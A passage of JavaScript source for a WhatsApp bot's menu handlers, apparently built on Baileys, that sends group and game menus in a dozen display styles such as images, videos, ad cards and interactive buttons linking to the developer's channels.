                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'groupmenu': {
ToxxicTechInc.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${groupmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'gamemenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${gamemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
